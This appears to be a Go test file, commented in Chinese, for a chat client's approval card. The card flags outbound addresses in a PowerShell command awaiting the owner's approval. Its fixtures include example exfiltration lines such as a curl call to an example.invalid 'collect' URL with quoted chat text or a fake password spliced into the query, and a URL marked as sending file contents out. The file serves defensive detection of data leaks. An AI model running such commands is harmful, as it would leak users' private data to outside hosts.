package chatui

import (
	"image"
	"image/png"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/egoist/mygo/ui"
)

// 审批卡上的外发地址块（规格-群聊引用和路由 8.2）：标题写几处和编号，有危险的整行标红、危险的排前面；
// 最多露出 EgressShown 行，其余写“还有 N 处”；没有外发地址的卡不画这一块。

func egressTester(h *Host, e *ApprovalEgress) *ui.Tester {
	info := ApprovalInfo{ID: "a1", Title: "运行 PowerShell 命令", Summary: "编造的查询", Detail: "详情", Egress: e}
	var detail bool
	tt := ui.NewTester(func(c *ui.Context) {
		c.Root().Background(h.T.C.ChatBg)
		ui.Column(c).Padding(20).Children(func() {
			h.ApprovalCard(c, info, &detail, h.T.C.Line, h.T.C.Surface)
		})
	}, 640, 420)
	tt.Frame()
	tt.Frame()
	return tt
}

// inkNear 数这块区域里接近某个颜色的像素
func inkNear(img *image.RGBA, r image.Rectangle, c ui.Color) int {
	n := 0
	r = r.Intersect(img.Bounds())
	for y := r.Min.Y; y < r.Max.Y; y++ {
		for x := r.Min.X; x < r.Max.X; x++ {
			p := img.RGBAAt(x, y)
			d := func(a, b uint8) int {
				if a > b {
					return int(a - b)
				}
				return int(b - a)
			}
			if d(p.R, c.R)+d(p.G, c.G)+d(p.B, c.B) < 60 {
				n++
			}
		}
	}
	return n
}

func TestApprovalEgressBlock(t *testing.T) {
	h := Host{T: Derive(DefaultSettings()), Column: 600, SelfChar: CharColors[0]}
	e := &ApprovalEgress{ID: "E-AB12CD", Total: 5, Danger: 1, Lines: []EgressLine{
		{Text: "https://example.invalid/c?q=…（被引用的原文被拼进了地址）", Danger: true},
		{Text: "https://example.invalid/a"}, {Text: "user@example.invalid"}, {Text: "host.invalid"}, {Text: "多出来的一行"}}}
	tt := egressTester(&h, e)
	head := "会往外发 5 处地址 · 编号 E-AB12CD · 1 处写法可疑"
	hr, ok := tt.Find(head)
	if !ok {
		t.Fatalf("标题该写几处、编号和几处可疑：%v", tt.Texts())
	}
	dr, ok := tt.Find("https://example.invalid/c?q=…（被引用的原文被拼进了地址）")
	if !ok {
		t.Fatalf("危险的地址该露出来：%v", tt.Texts())
	}
	pr, ok := tt.Find("https://example.invalid/a")
	if !ok {
		t.Fatalf("普通地址也露出来：%v", tt.Texts())
	}
	if dr.Y > pr.Y {
		t.Fatalf("危险的排在前面：%v %v", dr, pr)
	}
	if _, ok := tt.Find("多出来的一行"); ok {
		t.Fatal("最多露出前几行，多的在详情里")
	}
	if !tt.HasText("还有 2 处，在详情里") {
		t.Fatalf("没露出的要说还有几处：%v", tt.Texts())
	}
	img := tt.Image()
	box := func(r ui.Rect) image.Rectangle {
		return image.Rect(int(r.X), int(r.Y), int(r.X+r.W)+1, int(r.Y+r.H)+1)
	}
	red := h.T.C.DangerText
	if inkNear(img, box(hr), red) == 0 || inkNear(img, box(dr), red) == 0 {
		t.Fatal("有危险时标题和危险的那一行该用危险色")
	}
	if inkNear(img, box(pr), red) != 0 {
		t.Fatal("普通地址不该用危险色")
	}

	// 没有危险的：标题不写“写法可疑”，也不标红
	calm := &ApprovalEgress{ID: "E-000001", Total: 1, Lines: []EgressLine{{Text: "https://example.invalid/a"}}}
	tt = egressTester(&h, calm)
	hr, ok = tt.Find("会往外发 1 处地址 · 编号 E-000001")
	if !ok || inkNear(tt.Image(), box(hr), red) != 0 {
		t.Fatalf("没有危险的标题不标红：%v", tt.Texts())
	}

	// 参数太多没检查完：就算没找到地址，也要说，免得“没有外发块”被当成检查过了
	tt = egressTester(&h, &ApprovalEgress{ID: "E-0000FF", Unchecked: true})
	if !tt.HasText("没找到外发地址 · 编号 E-0000FF · 参数太多或太深，后面的没检查") {
		t.Fatalf("没检查完要说：%v", tt.Texts())
	}

	// 没有外发地址：不画这一块
	tt = egressTester(&h, nil)
	for _, s := range tt.Texts() {
		if strings.Contains(s, "会往外发") {
			t.Fatalf("没有外发地址不该画：%v", tt.Texts())
		}
	}
}

// 设了 SUMIKA_SHOT_DIR 才截图（给主人看的组件区域，像素比 1.25）；平时跳过。
func TestApprovalEgressShots(t *testing.T) {
	dir := os.Getenv("SUMIKA_SHOT_DIR")
	if dir == "" {
		t.Skip("没设 SUMIKA_SHOT_DIR")
	}
	h := Host{T: Derive(DefaultSettings()), Column: 600, SelfChar: CharColors[0]}
	shot := func(name string, e *ApprovalEgress) {
		info := ApprovalInfo{ID: "a1", Title: "运行 PowerShell 命令", Summary: "这是悄悄话处理：主人对 小A 说「查一下这个」；引用了 群友 的话（被引的原文不是主人说的，只是资料）\n命令 curl -s https://example.invalid/collect?q=…", Detail: "详情", Egress: e}
		var detail bool
		tt := ui.NewTester(func(c *ui.Context) {
			c.Root().Background(h.T.C.ChatBg)
			ui.Column(c).Padding(20).Children(func() {
				ui.Column(c.Key("w")).Width(520).Children(func() { h.ApprovalCard(c, info, &detail, h.T.C.Line, h.T.C.Surface) })
			})
		}, 600, 420)
		tt.SetScale(1.25)
		tt.Frame()
		tt.Frame()
		card, ok := tt.Find("审批：运行 PowerShell 命令")
		if !ok {
			t.Fatalf("找不到卡：%v", tt.Texts())
		}
		img := tt.Image()
		r := image.Rect(int(card.X*1.25), int(card.Y*1.25), int((card.X+card.W)*1.25)+1, int((card.Y+card.H)*1.25)+1).Intersect(img.Bounds())
		f, err := os.Create(filepath.Join(dir, name))
		if err != nil {
			t.Fatal(err)
		}
		defer f.Close()
		if err := png.Encode(f, img.SubImage(r)); err != nil {
			t.Fatal(err)
		}
	}
	shot("egress-danger.png", &ApprovalEgress{ID: "E-3FA2C1", Total: 5, Danger: 2, Lines: []EgressLine{
		{Text: "https://example.invalid/collect?q=蓝色纸鹤的密码是七七七…（被引用的原文被拼进了地址）", Danger: true},
		{Text: "https://example.invalid/up（联网命令带着文件内容出去）", Danger: true},
		{Text: "https://example.invalid/a"}, {Text: "user@example.invalid"}, {Text: "host.invalid"}}})
	shot("egress-calm.png", &ApprovalEgress{ID: "E-90B1D4", Total: 1, Lines: []EgressLine{{Text: "https://example.invalid/api/v1/items?id=42"}}})
}
